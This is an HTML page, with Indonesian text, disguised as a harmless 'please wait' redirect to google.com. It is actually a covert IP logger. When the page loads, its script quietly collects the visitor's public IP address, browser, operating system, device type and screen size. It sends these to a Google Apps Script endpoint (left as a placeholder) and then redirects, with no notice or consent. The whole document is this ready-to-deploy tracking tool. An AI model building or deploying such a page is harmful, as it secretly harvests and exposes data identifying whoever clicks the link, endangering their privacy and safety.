<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting</title>
  <script> var redirectUrl = "https://www.google.com/"; </script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
      background-color: #f0f0f0;
      text-align: center;
      margin: 0;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    h1 {
      color: #333;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Tunggu Sebentar!...</h1>
  <p>Jika tidak dialihkan secara otomatis, silakan klik <a id="redirectLink">tautan ini</a>.</p>
</div>

<script>
  // Set the manual link's href attribute using the variable
  document.getElementById("redirectLink").href = redirectUrl;

  // Replace with your deployed Google Apps Script Web App URL
  const SCRIPT_URL = 'YOUR_WEB_APP_URL_HERE';

  // Function to get system information
  function getSystemInfo() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Desktop';

    // Get Browser info
    if (userAgent.includes('Chrome')) {
      browser = 'Chrome';
      browserVersion = userAgent.match(/Chrome\/(\S+)/)[1];
    } else if (userAgent.includes('Firefox')) {
      browser = 'Firefox';
      browserVersion = userAgent.match(/Firefox\/(\S+)/)[1];
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
      browser = 'Safari';
      browserVersion = userAgent.match(/Version\/(\S+)/)[1];
    } else if (userAgent.includes('Edge')) {
      browser = 'Edge';
      browserVersion = userAgent.match(/Edge\/(\S+)/)[1];
    }

    // Get OS info
    if (userAgent.includes('Windows')) {
      os = 'Windows';
    } else if (userAgent.includes('Macintosh')) {
      os = 'macOS';
    } else if (userAgent.includes('Linux')) {
      os = 'Linux';
    } else if (userAgent.includes('Android')) {
      os = 'Android';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
      os = 'iOS';
    }

    // Get Device Type
    if (/Mobi|Android|iPhone|iPad/.test(userAgent)) {
      deviceType = 'Mobile';
    }

    return {
      Browser: browser,
      BrowserVersion: browserVersion,
      OS: os,
      DeviceType: deviceType,
      ScreenSize: `${window.screen.width}x${window.screen.height}`
    };
  }

  // Asynchronously get public IP address from a third-party service
  async function getPublicIp() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Could not get public IP:', error);
      return 'IP Fetch Error';
    }
  }

  // Main function to gather data and send it, then redirect
  async function logDataAndRedirect() {
    const publicIp = await getPublicIp();
    const systemInfo = getSystemInfo();

    const dataToSend = {
      Timestamp: new Date().toLocaleString(),
      PublicIP: publicIp,
      ...systemInfo
    };

    console.log('Sending data:', dataToSend);

    try {
      const response = await fetch(SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors', // Use no-cors to prevent CORS issues with App Script
        cache: 'no-cache',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToSend),
      });

      console.log('Post request sent.');
      // Note: No-CORS prevents reading the response, but ensures the request goes through.
    } catch (error) {
      console.error('Failed to send data to App Script:', error);
    }
    
    // Redirect the user immediately after the fetch request is sent
    window.location.href = redirectUrl;
  }

  // Call the main function when the page loads
  window.addEventListener('load', logDataAndRedirect);
</script>

</body>
</html>
